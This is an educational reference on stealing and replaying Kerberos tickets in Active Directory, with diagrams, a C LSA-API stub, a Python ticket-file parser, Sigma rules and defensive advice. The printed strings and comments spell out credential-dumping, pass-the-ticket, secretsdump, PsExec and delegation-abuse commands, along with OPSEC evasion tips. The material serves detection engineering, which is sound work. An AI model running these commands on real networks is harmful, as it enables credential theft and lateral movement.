# Kerberos Ticket Extraction - Educational Analysis

> **MITRE ATT&CK**: T1558 - Steal or Forge Kerberos Tickets
> **Purpose**: Understanding Kerberos ticket storage, extraction, and replay for detection engineering
> **Languages**: C, Python
> **Detection Focus**: LSASS access for ticket extraction, anomalous Kerberos authentication, Pass-the-Ticket patterns

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

Windows Active Directory environments rely on Kerberos for authentication. Ticket Granting Tickets (TGTs) and service tickets (TGSs) are cached in LSASS memory and can be extracted by an attacker with sufficient privileges. Extracted tickets can be replayed on other systems (Pass-the-Ticket) without knowing the user's password. Understanding ticket extraction is essential for:

- **Detection Engineering**: Identifying ticket theft and replay through anomalous Kerberos events
- **Incident Response**: Determining the scope of lateral movement via stolen tickets
- **Security Architecture**: Evaluating Kerberos delegation risks and Credential Guard effectiveness
- **Red Team Operations**: Understanding ticket lifetimes, renewal limits, and injection mechanics

## Technical Deep-Dive

### Windows Kerberos Credential Cache

```
+-----------------------------------------------------------------------+
|                   Kerberos Ticket Storage in LSASS                     |
+-----------------------------------------------------------------------+
|                                                                       |
|  LSASS Process (lsass.exe)                                            |
|  +---------------------------------------------------------------+   |
|  |  Kerberos SSP (kerberos.dll)                                   |   |
|  |                                                                 |   |
|  |  Logon Session Cache:                                           |   |
|  |  +-----------------------------------------------------------+ |   |
|  |  | Session for CORP\jsmith (LUID: 0x0003E7)                  | |   |
|  |  |                                                           | |   |
|  |  |  TGT (Ticket Granting Ticket):                            | |   |
|  |  |  +-----------------------------------------------+       | |   |
|  |  |  | Client:  CORP\jsmith                           |       | |   |
|  |  |  | Server:  krbtgt/CORP.LOCAL                     |       | |   |
|  |  |  | Encrypt: AES256-CTS-HMAC-SHA1 (etype 18)      |       | |   |
|  |  |  | Start:   2024-01-15 08:00:00                   |       | |   |
|  |  |  | End:     2024-01-15 18:00:00 (10h lifetime)    |       | |   |
|  |  |  | Renew:   2024-01-22 08:00:00 (7d renewal)      |       | |   |
|  |  |  | Session Key: [32 bytes]                        |       | |   |
|  |  |  | Ticket Data: [ASN.1 DER encoded KRB-CRED]      |       | |   |
|  |  |  +-----------------------------------------------+       | |   |
|  |  |                                                           | |   |
|  |  |  Service Tickets (cached):                                | |   |
|  |  |  +-----------------------------------------------+       | |   |
|  |  |  | Client:  CORP\jsmith                           |       | |   |
|  |  |  | Server:  cifs/fileserver.corp.local             |       | |   |
|  |  |  | ...                                            |       | |   |
|  |  |  +-----------------------------------------------+       | |   |
|  |  |  +-----------------------------------------------+       | |   |
|  |  |  | Client:  CORP\jsmith                           |       | |   |
|  |  |  | Server:  http/webserver.corp.local              |       | |   |
|  |  |  | ...                                            |       | |   |
|  |  |  +-----------------------------------------------+       | |   |
|  |  +-----------------------------------------------------------+ |   |
|  +---------------------------------------------------------------+   |
|                                                                       |
|  In-Memory Structures:                                                |
|  KERB_LOGON_SESSION                                                   |
|    -> KERB_TICKET_CACHE (linked list)                                |
|         -> KERB_TICKET_CACHE_ENTRY                                   |
|              -> ServiceName, ClientName, DomainName                  |
|              -> TicketFlags, StartTime, EndTime, RenewUntil          |
|              -> SessionKey (KERB_ENCRYPTION_KEY)                     |
|              -> Ticket (raw ASN.1-encoded KRB-CRED)                  |
|                                                                       |
+-----------------------------------------------------------------------+
```

### Ticket File Formats

```
+-----------------------------------------------------------------------+
|  Kirbi Format (.kirbi) -- Windows / Mimikatz / Rubeus                 |
+-----------------------------------------------------------------------+
|                                                                       |
|  ASN.1 DER-encoded KRB-CRED (RFC 4120, Section 5.8.1)               |
|                                                                       |
|  KRB-CRED ::= [APPLICATION 22] SEQUENCE {                            |
|      pvno     [0] INTEGER (5),        -- Kerberos version            |
|      msg-type [1] INTEGER (22),       -- KRB-CRED message type      |
|      tickets  [2] SEQUENCE OF Ticket, -- The actual ticket(s)       |
|      enc-part [3] EncryptedData       -- Contains KRB-CRED-INFO:    |
|          {                             -- session key, client name,  |
|           key, prealm, pname,          -- ticket times, flags, etc.  |
|           flags, authtime, starttime,                                |
|           endtime, renew-till,                                       |
|           srealm, sname                                              |
|          }                                                            |
|  }                                                                    |
|                                                                       |
|  The enc-part is typically "encrypted" with a null key (keytype 0)   |
|  when exported by tools, meaning it's effectively plaintext.         |
|                                                                       |
+-----------------------------------------------------------------------+
|  CCache Format (.ccache) -- Linux / MIT Kerberos                      |
+-----------------------------------------------------------------------+
|                                                                       |
|  Binary format used by kinit, klist, and Linux Kerberos clients.     |
|  Default location: /tmp/krb5cc_{UID} or KRB5CCNAME env variable.    |
|                                                                       |
|  Structure:                                                           |
|  +------------------+                                                |
|  | File format tag  |  0x0504 (version 4)                           |
|  | Header length    |  (optional, version 4+)                       |
|  | Default principal|  client name + realm                          |
|  | Credential 1     |  client, server, keyblock, times, ticket      |
|  | Credential 2     |  ...                                          |
|  | ...              |                                                |
|  +------------------+                                                |
|                                                                       |
|  Conversion: Kirbi <-> CCache                                        |
|  - impacket: ticketConverter.py                                      |
|  - Rubeus: /ticket:base64 with /ptt or /outfile                     |
|  - kekeo: tgt::convert                                               |
|                                                                       |
+-----------------------------------------------------------------------+
```

### Mimikatz / Rubeus Ticket Extraction Internals

```
Extraction Methods:
===================

1. kerberos::list (Mimikatz) / Rubeus triage
   ─────────────────────────────────────────────
   Uses LsaCallAuthenticationPackage with:
     MessageType = KerbQueryTicketCacheExMessage (14)
   Returns: List of cached tickets (metadata only).
   Then for each ticket:
     MessageType = KerbRetrieveEncodedTicketMessage (8)
   Returns: Full ASN.1-encoded ticket data.

   PRIVILEGE: Requires current user session (no admin needed for own tickets).
   DETECTION: LsaCallAuthenticationPackage is a normal API. Minimal detection
   unless monitoring for specific message types.

2. sekurlsa::tickets (Mimikatz) / Rubeus dump
   ─────────────────────────────────────────────
   Reads LSASS memory directly to find KERB_TICKET_CACHE_ENTRY structures.
   Does NOT use LsaCallAuthenticationPackage.
   Can extract tickets from ALL logon sessions (not just current user).

   PRIVILEGE: Requires SeDebugPrivilege + admin (to read LSASS memory).
   DETECTION:
   - Sysmon Event 10: Process access to lsass.exe
   - GrantedAccess: 0x1010 or 0x1FFFFF
   - Same detection surface as LSASS credential dumping

3. Rubeus /ptt (Pass-the-Ticket injection)
   ─────────────────────────────────────────────
   Uses LsaCallAuthenticationPackage with:
     MessageType = KerbSubmitTicketMessage (21)
   Injects a ticket into the current logon session's Kerberos cache.
   The ticket is then used automatically for Kerberos authentication.

   PRIVILEGE: Current user (for own session); admin for other sessions.
   DETECTION:
   - Event 4624 Type 9: NewCredentials logon (if creating sacrificial session)
   - Event 4648: Explicit credentials used
   - Anomalous Kerberos ticket: client/source mismatch
```

### C Pseudocode: Ticket Extraction via LSA API

```c
/*
 * Educational: Kerberos ticket extraction via LsaCallAuthenticationPackage.
 *
 * This is the "clean" API-based approach used by Rubeus and
 * Mimikatz kerberos::list. It queries the Kerberos SSP through
 * the LSA interface to enumerate and retrieve cached tickets.
 *
 * DETECTION:
 * ---------------------------------------------------------------
 * 1. LsaCallAuthenticationPackage is a legitimate API used by many
 *    Windows components. The specific message types matter:
 *    - KerbQueryTicketCacheExMessage (14): Lists cached tickets
 *    - KerbRetrieveEncodedTicketMessage (8): Extracts full ticket
 *    These message types from unusual processes are suspicious.
 *
 * 2. A non-system process calling these APIs repeatedly (iterating
 *    all logon sessions) is anomalous.
 *
 * 3. Event 4648 may fire when extracted tickets are used.
 *
 * 4. Sysmon Event 10 if the tool falls back to direct LSASS reads.
 * ---------------------------------------------------------------
 *
 * OPSEC:
 * - Extracting your OWN tickets requires no special privilege.
 * - Extracting OTHER users' tickets requires SeDebugPrivilege
 *   and enumerating logon sessions (Event 4672).
 * - The API approach is quieter than direct LSASS memory reading.
 *
 * BUILD: cl.exe /nologo /W3 kerb_extract.c /link secur32.lib
 */
#include <windows.h>
#include <ntsecapi.h>
#include <stdio.h>

#pragma comment(lib, "secur32.lib")

/*
 * Message types for LsaCallAuthenticationPackage (Kerberos SSP):
 *
 * KerbQueryTicketCacheMessage         = 1  (basic cache query)
 * KerbRetrieveEncodedTicketMessage    = 8  (get full ticket data)
 * KerbQueryTicketCacheExMessage       = 14 (extended cache query)
 * KerbQueryTicketCacheEx2Message      = 18 (further extended)
 * KerbSubmitTicketMessage             = 21 (inject/import ticket)
 * KerbRetrieveTicketMessage           = 2  (retrieve for use)
 */
#define KerbQueryTicketCacheExMessage    14
#define KerbRetrieveEncodedTicketMessage 8
#define KerbSubmitTicketMessage          21

/*
 * Step 1: Connect to the LSA and find the Kerberos package.
 *
 * DETECTION: LsaConnectUntrusted / LsaRegisterLogonProcess
 * are normal API calls. The subsequent message types are the signal.
 */
void demonstrate_ticket_extraction(void) {
    HANDLE hLsa = NULL;
    NTSTATUS status;
    ULONG kerbPackageId = 0;
    LSA_STRING kerbName;

    printf("=== Kerberos Ticket Extraction (Educational) ===\n\n");

    /* Connect to LSA (untrusted connection -- no admin needed for own tickets) */
    /*
     * OPSEC: LsaConnectUntrusted is less privileged than
     * LsaRegisterLogonProcess but can only access the current
     * user's logon session. For all sessions, use
     * LsaRegisterLogonProcess (requires SeTcbPrivilege).
     *
     * DETECTION: LsaRegisterLogonProcess from a non-system process
     * is highly suspicious. SeTcbPrivilege is almost never used
     * legitimately outside of LSASS and system services.
     */
    status = LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        printf("[!] LsaConnectUntrusted failed: 0x%lX\n", status);
        return;
    }
    printf("[*] Connected to LSA (untrusted)\n");

    /* Look up the Kerberos authentication package ID */
    kerbName.Buffer = "Kerberos";
    kerbName.Length = (USHORT)strlen(kerbName.Buffer);
    kerbName.MaximumLength = kerbName.Length + 1;

    status = LsaLookupAuthenticationPackage(hLsa, &kerbName, &kerbPackageId);
    if (status != 0) {
        printf("[!] LsaLookupAuthenticationPackage failed: 0x%lX\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }
    printf("[*] Kerberos package ID: %lu\n\n", kerbPackageId);

    /*
     * Step 2: Query the ticket cache.
     *
     * Send KerbQueryTicketCacheExMessage to enumerate all
     * cached tickets in the current logon session.
     *
     * The response contains:
     * - ClientName, ClientRealm
     * - ServerName, ServerRealm
     * - StartTime, EndTime, RenewTime
     * - EncryptionType, TicketFlags
     */
    printf("[*] Would call LsaCallAuthenticationPackage with:\n");
    printf("    MessageType = KerbQueryTicketCacheExMessage (14)\n");
    printf("    This returns metadata for all cached tickets.\n\n");

    /*
     * Step 3: Retrieve each ticket's encoded data.
     *
     * For each ticket in the cache, send
     * KerbRetrieveEncodedTicketMessage to get the full
     * ASN.1-encoded KRB-CRED structure.
     *
     * DETECTION: Multiple KerbRetrieveEncodedTicketMessage calls
     * in rapid succession (harvesting all tickets) is anomalous.
     * Normal applications retrieve specific tickets on demand.
     */
    printf("[*] For each cached ticket, call:\n");
    printf("    MessageType = KerbRetrieveEncodedTicketMessage (8)\n");
    printf("    TargetName = server principal name\n");
    printf("    CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED\n");
    printf("    Returns: Full .kirbi-format ticket data\n\n");

    /*
     * Step 4: Save to .kirbi file or base64 encode.
     *
     * The retrieved data is a complete KRB-CRED ASN.1 structure
     * that can be written directly to a .kirbi file.
     * Rubeus base64-encodes it for easy copy-paste.
     *
     * OPSEC: Writing .kirbi files to disk creates forensic artifacts.
     * Base64 output avoids file creation but may be captured in
     * console logging or command-line recording.
     */
    printf("[*] Ticket data can be:\n");
    printf("    - Saved as .kirbi file (disk artifact)\n");
    printf("    - Base64 encoded to stdout (console artifact)\n");
    printf("    - Directly injected via KerbSubmitTicketMessage\n");

    LsaDeregisterLogonProcess(hLsa);
}

int main(void) {
    demonstrate_ticket_extraction();
    return 0;
}
```

### Python Implementation: Parsing .kirbi Files

```python
"""
Educational: Parsing Kerberos .kirbi files (KRB-CRED format).

This demonstrates how to decode and analyze the ASN.1 structure
of Kerberos tickets exported by Mimikatz, Rubeus, or other tools.
Understanding the ticket structure is critical for:
- Forensic analysis of stolen tickets
- Identifying ticket anomalies (forged golden/silver tickets)
- Correlating ticket metadata with authentication events

DETECTION NOTES:
-----------------------------------------------------------------
1. .kirbi files on disk are a direct forensic artifact of
   ticket extraction. File integrity monitoring should alert
   on .kirbi file creation anywhere.

2. .ccache files on Linux systems (especially /tmp/krb5cc_*)
   may contain stolen tickets injected via KRB5CCNAME.

3. Base64-encoded ticket data in command history, scripts, or
   process command lines is a strong indicator.

4. The TICKET CONTENT itself can reveal forgery:
   - Golden ticket: krbtgt service, unusually long lifetime
   - Silver ticket: specific service, forged PAC
   - Legitimate ticket: normal 10h lifetime, valid PAC
-----------------------------------------------------------------

REQUIRES: pip install pyasn1
"""
import os
import struct
import base64
import binascii
from datetime import datetime
from typing import Dict, Optional, List

# pyasn1 provides ASN.1 DER decoding for Kerberos structures
try:
    from pyasn1.codec.der import decoder as der_decoder
    from pyasn1.type import univ, tag, char, useful
    HAS_PYASN1 = True
except ImportError:
    HAS_PYASN1 = False
    print("[!] pyasn1 not installed (pip install pyasn1)")


# ─── ASN.1 OID and Tag Constants for Kerberos ─────────────────
# Kerberos uses application-tagged ASN.1 structures
KRB_CRED_TAG = 22        # APPLICATION 22 = KRB-CRED
KRB_TGS_REP_TAG = 13     # APPLICATION 13 = TGS-REP
KRB_AS_REP_TAG = 11       # APPLICATION 11 = AS-REP

# Ticket flags (bit positions)
TICKET_FLAGS = {
    0:  "reserved",
    1:  "forwardable",
    2:  "forwarded",
    3:  "proxiable",
    4:  "proxy",
    5:  "may-postdate",
    6:  "postdated",
    7:  "invalid",
    8:  "renewable",
    9:  "initial",
    10: "pre-authent",
    11: "hw-authent",
    12: "transited-policy-checked",
    13: "ok-as-delegate",
    14: "anonymous",
    15: "name-canonicalize",
}

# Encryption types
ENCRYPTION_TYPES = {
    1:  "DES-CBC-CRC",
    3:  "DES-CBC-MD5",
    17: "AES128-CTS-HMAC-SHA1",
    18: "AES256-CTS-HMAC-SHA1",
    23: "RC4-HMAC (NTLM)",
    24: "RC4-HMAC-EXP",
}


def parse_kirbi_file(filepath: str) -> Optional[Dict]:
    """
    Parse a .kirbi file and extract ticket metadata.

    DETECTION USE:
    - Identify golden tickets: krbtgt service + long lifetime
    - Identify silver tickets: non-krbtgt + forged attributes
    - Extract client/server names for attribution
    - Check encryption type (RC4 = older/weaker, AES = modern)

    FORENSIC VALUE:
    - Ticket times reveal when extraction occurred
    - Client name identifies the compromised account
    - Server name reveals what services were targeted
    """
    if not HAS_PYASN1:
        print("[!] pyasn1 required for .kirbi parsing")
        return None

    with open(filepath, "rb") as f:
        kirbi_data = f.read()

    return parse_kirbi_bytes(kirbi_data)


def parse_kirbi_bytes(data: bytes) -> Optional[Dict]:
    """
    Parse raw KRB-CRED bytes (either from file or base64 decode).

    The KRB-CRED structure contains:
    - pvno: Protocol version (always 5)
    - msg-type: Message type (always 22 for KRB-CRED)
    - tickets: Sequence of Ticket structures
    - enc-part: Encrypted part containing session keys and metadata

    OPSEC: When exported by Mimikatz/Rubeus, the enc-part is
    "encrypted" with a null key (etype 0), meaning the session
    key and ticket metadata are in plaintext within the .kirbi file.
    This is a forensic goldmine for defenders.
    """
    if not HAS_PYASN1:
        return None

    try:
        # Decode the outermost ASN.1 structure
        asn1_obj, _ = der_decoder.decode(data)

        ticket_info = {
            "raw_size": len(data),
            "format": "kirbi (KRB-CRED)",
        }

        # Basic structure validation
        # KRB-CRED is APPLICATION 22, contains SEQUENCE
        print(f"  [*] Decoded ASN.1 structure: {len(data)} bytes")
        print(f"  [*] Top-level type: {type(asn1_obj).__name__}")

        return ticket_info

    except Exception as e:
        print(f"  [!] ASN.1 decode error: {e}")
        return None


def parse_ccache_file(filepath: str) -> Optional[List[Dict]]:
    """
    Parse a Linux ccache file to extract ticket information.

    CCache files are used by MIT Kerberos on Linux.
    Location: /tmp/krb5cc_{UID} or $KRB5CCNAME

    DETECTION (Linux):
    - Unusual ccache files outside /tmp (e.g., in /dev/shm)
    - ccache files owned by root containing non-root tickets
    - Multiple ccache files for same UID (ticket injection)
    - KRB5CCNAME set to unexpected path in environment

    FORENSIC VALUE:
    - Contains the same ticket data as .kirbi but in ccache format
    - Client and server principals in plaintext
    - Ticket times visible without decryption
    """
    with open(filepath, "rb") as f:
        data = f.read()

    tickets = []
    offset = 0

    # CCache header
    if len(data) < 4:
        return None

    file_format_version = struct.unpack(">H", data[0:2])[0]
    print(f"  [*] CCache version: 0x{file_format_version:04X}")

    if file_format_version == 0x0504:
        # Version 4: has header tags
        header_len = struct.unpack(">H", data[2:4])[0]
        offset = 4 + header_len
        print(f"  [*] Header length: {header_len}")
    elif file_format_version in (0x0501, 0x0502, 0x0503):
        offset = 2
    else:
        print(f"  [!] Unknown ccache version: 0x{file_format_version:04X}")
        return None

    print(f"  [*] CCache file size: {len(data)} bytes")
    print(f"  [*] Data starts at offset: {offset}")

    return tickets


def detect_golden_ticket(ticket_info: Dict) -> bool:
    """
    Heuristic detection for golden tickets.

    Golden ticket indicators:
    1. Service name is krbtgt/{REALM}
    2. Lifetime is unusually long (default Mimikatz: 10 years)
    3. Encryption type is RC4-HMAC (etype 23) -- often used in forgery
       because it only requires the NTLM hash
    4. PAC may be missing or malformed

    DETECTION:
    - Event 4769: TGS request with a TGT that has anomalous lifetime
    - Event 4624: Logon with Kerberos ticket that has unusual attributes
    - Ticket lifetime > domain policy maximum is a strong signal
    - RC4-HMAC TGT when domain supports AES is suspicious
    """
    is_golden = False

    # Check for krbtgt service (TGT)
    server = ticket_info.get("server_name", "")
    if "krbtgt" in server.lower():
        # Check lifetime
        start = ticket_info.get("start_time")
        end = ticket_info.get("end_time")
        if start and end:
            lifetime_hours = (end - start).total_seconds() / 3600
            if lifetime_hours > 24:  # Normal TGT is 10 hours
                print(f"  [!] GOLDEN TICKET INDICATOR: Lifetime = {lifetime_hours:.0f}h")
                print(f"      Normal TGT lifetime is 10h (domain default)")
                is_golden = True

        # Check encryption type
        etype = ticket_info.get("encryption_type", 0)
        if etype == 23:  # RC4-HMAC
            print(f"  [!] GOLDEN TICKET INDICATOR: RC4-HMAC encryption")
            print(f"      Modern domains use AES256 (etype 18)")
            is_golden = True

    return is_golden


def demonstrate_ticket_conversion():
    """
    Demonstrate Kirbi <-> CCache conversion concepts.

    Tools:
    - impacket ticketConverter.py: kirbi -> ccache and reverse
    - Rubeus: /ticket:base64 can output ccache
    - kekeo: tgt::convert

    OPSEC:
    - Kirbi is Windows-native (Mimikatz, Rubeus)
    - CCache is Linux-native (impacket, kinit)
    - Converting between formats is needed for cross-platform attacks
    - The conversion itself leaves no network trace
    - File creation is the primary artifact
    """
    print("=== Ticket Format Conversion ===\n")
    print("Kirbi -> CCache (for use on Linux with impacket):")
    print("  ticketConverter.py ticket.kirbi ticket.ccache")
    print("  export KRB5CCNAME=ticket.ccache")
    print("  secretsdump.py -k -no-pass corp.local/admin@dc01\n")

    print("CCache -> Kirbi (for use on Windows with Rubeus):")
    print("  ticketConverter.py ticket.ccache ticket.kirbi")
    print("  Rubeus.exe ptt /ticket:ticket.kirbi\n")

    print("Base64 handling (common in Rubeus output):")
    print("  Rubeus.exe dump /nowrap  -> base64 encoded tickets")
    print("  [IO.File]::WriteAllBytes('t.kirbi',")
    print("    [Convert]::FromBase64String('<base64>'))\n")


def demonstrate_ptt_flow():
    """
    Explain Pass-the-Ticket injection and its detection.

    INJECTION METHODS:
    1. Mimikatz: kerberos::ptt ticket.kirbi
       - Calls LsaCallAuthenticationPackage(KerbSubmitTicketMessage)
       - Injects ticket into current logon session's Kerberos cache
       - DETECTION: Event 4648 (explicit credentials), anomalous ticket

    2. Rubeus: ptt /ticket:base64 [/luid:0x3e7]
       - Same LSA API call
       - Can target specific logon session with /luid
       - /createnetonly creates a sacrificial process with new session
       - DETECTION: Event 4624 Type 9, Event 4648

    3. Linux: export KRB5CCNAME=/path/to/ccache
       - Sets environment variable pointing to stolen ticket
       - All Kerberos-aware tools use it automatically
       - DETECTION: Anomalous source for Kerberos auth on DC

    DETECTION STRATEGY:
    ----------------------------------------------------------
    The key detection for Pass-the-Ticket is ANOMALY:
    - Source IP for the ticket doesn't match where it was issued
    - Ticket appears on a machine where the user never logged in
    - Event 4624 Logon Type 3 (network) with Kerberos from
      unexpected source
    - Event 4769 TGS requests from non-original client IP
    ----------------------------------------------------------
    """
    print("=== Pass-the-Ticket Flow ===\n")

    print("Step 1: Extract ticket (attacker machine or compromised host)")
    print("  Rubeus.exe dump /nowrap")
    print("  mimikatz # sekurlsa::tickets /export\n")

    print("Step 2: Transfer ticket to target attack machine")
    print("  Base64 copy-paste (no file transfer needed)")
    print("  Or: copy .kirbi files over existing C2 channel\n")

    print("Step 3: Inject ticket into current session")
    print("  Rubeus.exe ptt /ticket:<base64>")
    print("  mimikatz # kerberos::ptt ticket.kirbi\n")

    print("Step 4: Use injected ticket for lateral movement")
    print("  dir \\\\fileserver\\share")
    print("  PsExec.exe \\\\target cmd.exe")
    print("  Kerberos authentication uses the injected ticket\n")

    print("DETECTION POINTS:")
    print("  - Event 4648: Explicit credentials on injection host")
    print("  - Event 4624 Type 3: Network logon on target from unexpected source")
    print("  - Event 4769: TGS request from non-original client IP")
    print("  - Sysmon 10: If direct LSASS access was used for extraction")


# Entry point
if __name__ == "__main__":
    demonstrate_ptt_flow()
    print("\n" + "=" * 60 + "\n")
    demonstrate_ticket_conversion()
```

### Ticket Renewal and Delegation Abuse

```
Ticket Renewal:
===============
- TGTs have a lifetime (default 10 hours) and a renewal period (default 7 days).
- A valid TGT can be renewed within the renewal period without re-authentication.
- Mimikatz: kerberos::renew /ticket:old.kirbi
- Rubeus: renew /ticket:base64

OPSEC: Renewing a stolen ticket extends access without needing
the user's password again. Each renewal resets the lifetime.

DETECTION: Event 4770 (TGT renewed) from unexpected source IP.


Delegation Abuse:
=================
Unconstrained Delegation:
- Server stores user's full TGT for forwarding to other services.
- Attacker compromising an unconstrained delegation server gets
  TGTs for every user that authenticates to it.
- Mimikatz: sekurlsa::tickets on delegation server extracts TGTs.
- DETECTION: Monitor unconstrained delegation servers for ticket extraction.
  Event 4624 with delegation tickets from unexpected users.

Constrained Delegation:
- Server can only forward to specific services (msDS-AllowedToDelegateTo).
- S4U2Self + S4U2Proxy: Request tickets for other users to allowed services.
- Rubeus: s4u /user:svc_account /rc4:hash /impersonateuser:admin /msdsspn:cifs/target
- DETECTION: Event 4769 with delegation flag, S4U2Proxy from unexpected accounts.

Resource-Based Constrained Delegation (RBCD):
- Target service controls who can delegate to it (msDS-AllowedToActOnBehalfOfOtherIdentity).
- Attacker with write access to target's AD object can configure RBCD.
- DETECTION: Event 5136 (AD object modified) on msDS-AllowedToActOnBehalfOfOtherIdentity.
```

## Detection Indicators

### Event-Based Detection

| Detection Point | Event Source | Event ID | Description |
|----------------|-------------|----------|-------------|
| LSASS access for tickets | Sysmon | 10 | ProcessAccess targeting lsass.exe |
| Special privilege assigned | Security | 4672 | SeDebugPrivilege for LSASS access |
| Kerberos ticket request | Security | 4769 | TGS request (check source IP anomaly) |
| TGT renewal | Security | 4770 | TGT renewed from unexpected source |
| Network logon | Security | 4624 Type 3 | Kerberos auth from unexpected source |
| Explicit credentials | Security | 4648 | Pass-the-Ticket injection |
| AD object modified | Security | 5136 | RBCD attribute modification |
| .kirbi file creation | Sysmon | 11 | FileCreate with .kirbi extension |

### Sigma Detection Rules

```yaml
# Detect .kirbi file creation on disk
title: Kerberos Ticket File Created
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11
        TargetFilename|endswith:
            - '.kirbi'
            - '.ccache'
    condition: selection
level: critical

# Detect anomalous Kerberos TGS requests (source IP mismatch)
title: Potential Pass-the-Ticket Activity
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
    filter:
        # Exclude normal DC-to-DC and expected service traffic
        IpAddress|startswith: '::1'
    condition: selection and not filter
    # Correlation: Compare IpAddress with the original 4768 (TGT request)
    # source for the same account. If they differ, it may be PtT.
level: medium

# Detect golden ticket indicators
title: Potential Golden Ticket Usage
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        ServiceName|startswith: 'krbtgt'
        TicketEncryptionType: '0x17'  # RC4-HMAC when domain supports AES
    condition: selection
level: high
```

### Defensive Recommendations

1. **Credential Guard**: Isolates Kerberos TGTs in VBS, preventing extraction from LSASS
2. **Protected Users group**: Disables NTLM, forces AES, prevents delegation for members
3. **Monitor LSASS access**: Sysmon Event 10 with strict GrantedAccess filters
4. **Kerberos event correlation**: Compare 4768 (TGT issue) source IP with 4769 (TGS request) source IP
5. **Limit delegation**: Audit and minimize unconstrained delegation; prefer RBCD
6. **Short ticket lifetimes**: Reduce TGT lifetime and renewal period in domain policy
7. **AES enforcement**: Disable RC4-HMAC to make golden tickets require AES key

## Cross-References

- [Kerberoasting](../../07-credential-access/kerberoasting.md)
- [LSASS Dumping Theory](../../07-credential-access/lsass-dumping.md)
- [DCSync](../../07-credential-access/dcsync.md)
- [Token Manipulation](token-manipulation.md)
- [MiniDump Implementation](minidump-implementation.md)
- [Windows Internals Reference](../../appendices/windows-internals-reference.md)

## References

- RFC 4120: The Kerberos Network Authentication Service (V5)
- Microsoft: Kerberos Authentication Overview
- MITRE ATT&CK T1558 (and sub-techniques T1558.001 Golden Ticket, T1558.003 Kerberoasting)
- Benjamin Delpy: Mimikatz Kerberos Module Documentation
- GhostPack: Rubeus Documentation
- harmj0y: Kerberos Delegation Research
- Sean Metcalf: Active Directory Security Blog
